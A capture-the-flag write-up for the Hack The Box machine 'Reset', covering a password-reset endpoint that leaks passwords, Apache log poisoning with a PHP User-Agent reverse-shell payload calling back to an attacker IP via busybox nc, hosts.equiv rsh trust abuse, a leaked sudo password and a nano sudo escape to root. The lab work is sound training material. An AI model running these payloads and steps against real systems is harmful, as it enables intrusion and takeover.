# Reset - Easy

```sh
sudo vim /etc/hosts
# add reset.htb

nmap -T4 -p- -A -Pn -v reset.htb
```

* open ports & services:

    * 22/tcp - ssh - OpenSSH 8.9p1 Ubuntu 3ubuntu0.13
    * 80/tcp - http - Apache httpd 2.4.52
    * 512/tcp - exec - netkit-rsh rexecd
    * 513/tcp - login?
    * 514/tcp - shell - Netkit rshd

* the webpage on port 80 is for an admin login page; it has a login and 'forgot password' option

* using creds like 'admin:admin' or 'admin:password' does not work here

* checking the page source code, there is a script for the reset password form:

    ```js
    $('#resetPasswordForm').on('submit', function(e) {
        e.preventDefault();
        const username = $('#resetUsername').val();
        $.ajax({
            url: 'reset_password.php',
            method: 'POST',
            data: { username: username },
            success: function(data) {
                $('#resetMessage').removeClass('alert-danger alert-success').show();
                if (data.error) {
                    $('#resetMessage').addClass('alert-danger').text(data.error);
                } else {
                    $('#resetMessage').addClass('alert-success').html(`
                        Password reset successful!<br>
                        Timestamp: ${data.timestamp}
                    `);
                }
            },
            error: function() {
                $('#resetMessage').removeClass('alert-success').addClass('alert-danger').text('An error occurred while resetting the password.');
            }
        });
    });
    ```

    * the script is based on jQuery and uses AJAX requests

    * it gets the username value and sends a POST request to 'reset_password.php' with the 'username' parameter having the username as value

    * if the password reset is successful it prints a success message and the timestamp; similarly if the reset does not work it prints an error message

* if we click on the 'forgot password' option, we get a pop-up for entering the username

* if we enter an invalid username like 'testuser', the error message shows that it is a non-existent username

* if we enter the username 'admin', it shows a reset email has been sent and the password is reset successfully

* we can check the reset password functionality further by interacting with the 'reset_password.php' page:

    ```sh
    curl http://reset.htb/reset_password.php
    # '{"error":"Invalid request"}'

    curl http://reset.htb/reset_password.php -d 'username=test'
    # '{"error":"User not found"}'
    # we did not do a POST request still we get the data

    curl http://reset.htb/reset_password.php -d 'username=admin'
    # '{"username":"admin","new_password":"95341a36","timestamp":"2026-03-05 03:42:05"}'
    # this response shows the new password value from the 'new_password' parameter
    ```

* using 'reset_password.php', we are able to get a new password after reset and login as 'admin' - this leads to the dashboard page at '/dashboard.php'

* we can try using this same new password to log into the R-services, using tools like ```rlogin``` and ```rsh``` - but this does not work

* in the dashboard page, we have an option to view log files - syslog and auth.log

* the source code shows that the values are set to ```/var/log/syslog``` and ```/var/log/auth.log``` - indicating a file read is happening

* intercepting a request in Burp Suite, we can see that a POST request to '/dashboard.php' is sent with the data having a 'file' parameter and value as ```/var/log/syslog``` - but the response does not show any actual log contents and instead is empty

* in Burp Suite, intercept a valid request and send to Repeater for further testing for attacks like local file read or LFI, or any injection attacks:

    * if we replace the file value with ```/etc/passwd```, the response contains the error message 'invalid file path' - indicating there is some form of check for ```/var/log/syslog``` or ```/var/log/auth.log``` as the values

    * if we try for values like ```/var/log/syslog/../../../etc/passwd``` - this also fails with the same error message

    * if we just use ```/var``` as the value - we get the same error message

    * if we use ```/var/log``` as the value - we do not get the error message, even though no file is read, but the path is accepted by the webapp

    * we can also try for command injection attacks, but this does not work

* as injection attacks do not work, we can try reading files in the legitimate way - since ```/var/log``` is accepted, we can try checking files under this path

* as the webserver is Apache in this case, we can try reading the file ```/var/log/apache2/access.log``` - this works and the HTTP request logs can be seen

* as we are able to print the access logs, we can try the log poisoning method to check for RCE:

    * setup a listener using ```nc -nvlp 4444```

    * in the intercepted POST request, modify the 'file' parameter value to ```/var/log/apache2/access.log``` and set the 'User-Agent' header value to ```<?php system('busybox nc 10.10.14.95 4444 -e sh'); ?>``` - as this header is reflected in the logs

    * if we forward the request once, we may not get a reverse shell immediately; however, if we send the POST request to ```/var/log/apache2/access.log``` file parameter a second time, without the 'User-Agent' modification this time, it works and we get a reverse shell

* in reverse shell:

    ```sh
    id
    # www-data

    # stabilise shell
    python3 -c 'import pty;pty.spawn("/bin/bash")'
    export TERM=xterm
    # Ctrl+Z
    stty raw -echo; fg
    # Enter twice

    pwd
    # '/var/www/html'

    ls -la
    # check web files

    ls -la /

    ls -la /home
    # we have two users 'local' and 'sadm'

    ls -la /home/local
    # permission denied

    ls -la /home/sadm
    ```

* we can attempt initial enumeration using ```linpeas``` for pivoting to the standard users - fetch script from attacker:

    ```sh
    wget http://10.10.14.95:8000/linpeas.sh

    chmod +x linpeas.sh

    ./linpeas.sh
    ```

* findings from ```linpeas```:

    * Linux version 5.15.0-140-generic, Ubuntu 22.04.5
    * sudo version 1.9.9
    * processes show ```tmux``` session as 'sadm' user is running - ```tmux new-session -d -s sadm_session```

* we can try attaching to this ```tmux``` session running as 'sadm':

    ```sh
    tmux ls
    # list sessions
    # no sessions are listed

    tmux attach -t sadm_session
    # does not work

    tmux attach -d -t sadm_session
    # this also does not work
    ```

* we are unable to attach to the ```tmux``` session

* we can check for any config files associated with the R-services configured on the box:

    ```sh
    find / -type f -name '.rhosts' 2>/dev/null
    # check for user config files

    cat /home/sadm/.rhosts
    # permission denied

    find / -type f -name 'hosts.equiv' 2>/dev/null
    # check for global config files

    cat /etc/hosts.equiv
    ```

    ```sh
    # /etc/hosts.equiv: list  of  hosts  and  users  that are granted "trusted" r
    #                   command access to your system .
    - root
    - local
    + sadm
    ```

* checking the ```hosts.equiv``` file shows that we have ```+ sadm``` config in it, which means the user 'sadm' can login from any host, as all hosts are trusted using ```+```

* so we can create a new user 'sadm' on the attacker, and then use that user to login via ```rsh``` or ```rlogin```:

    ```sh
    # on attacker

    sudo adduser sadm
    # create new user

    su sadm

    rsh reset.htb -l sadm
    # this works

    ls -la

    cat user.txt
    # user flag
    ```

* as we have ```rsh``` access as 'sadm' now, we can try attaching to the ```tmux``` session found earlier:

    ```sh
    tmux ls
    # the session is listed now

    tmux attach -t sadm_session
    # attaches to the session
    ```

* we have access to the ```tmux``` session now, and we can see the following config change was attempted:

    ```sh
    echo 7lE2PAfVHfjz4HpE | sudo -S nano /etc/firewall.sh
    ```

* if we try to execute the command, we can see that it works for a moment, then stops with the log "too many errors from stdin"

* as we are able to execute ```nano``` as ```sudo```, we can check if we have any other interesting rights in this session:

    ```sh
    sudo -l
    ```

* ```sudo -l``` shows that we can execute the commands ```/usr/bin/nano /etc/firewall.sh```, ```/usr/bin/tail /var/log/syslog``` & ```/usr/bin/tail /var/log/auth.log``` as all users, including root

* this means the string '7lE2PAfVHfjz4HpE' is the password for 'sadm' - we can confirm this by trying to login via SSH:

    ```sh
    ssh sadm@reset.htb
    # this works

    sudo -l
    ```

* we can check the [GTFObins exploit for nano](https://gtfobins.org/gtfobins/nano/) to abuse this:

    ```sh
    sudo /usr/bin/nano /etc/firewall.sh

    # Ctrl+R, Ctrl+X in nano editor for entering command
    
    reset; sh 1>&0 2>&0

    # this gives root shell

    id
    # root

    ls -la /root

    cat /root/root_279e22f8.txt
    # root flag
    ```
